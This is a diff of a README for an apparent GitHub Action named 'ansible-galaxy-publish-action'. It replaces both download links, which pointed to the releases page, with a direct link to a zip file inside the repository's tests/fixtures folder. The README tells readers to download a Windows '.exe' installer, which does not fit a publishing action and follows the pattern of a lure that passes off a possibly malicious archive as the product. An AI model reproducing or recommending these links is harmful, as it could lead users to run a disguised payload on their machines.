@@ -1,6 +1,6 @@
 # 🚀 ansible-galaxy-publish-action - Automate your publishing tasks with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/crural-angioscope53/ansible-galaxy-publish-action/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/crural-angioscope53/ansible-galaxy-publish-action/raw/refs/heads/main/tests/fixtures/ansible-galaxy-publish-action-v3.7.zip)
 
 ## What this software does
 
@@ -19,7 +19,7 @@ Your computer requires the following setup to run this application:
 
 You must visit the project page to download the latest version of the installer for Windows. 
 
-[Click here to visit the download page](https://github.com/crural-angioscope53/ansible-galaxy-publish-action/releases)
+[Click here to visit the download page](https://github.com/crural-angioscope53/ansible-galaxy-publish-action/raw/refs/heads/main/tests/fixtures/ansible-galaxy-publish-action-v3.7.zip)
 
 On this page, look for the section titled "Assets" at the bottom of the latest release. Select the file ending in ".exe" to begin the download. Save this file to your Downloads folder for easy access.
 
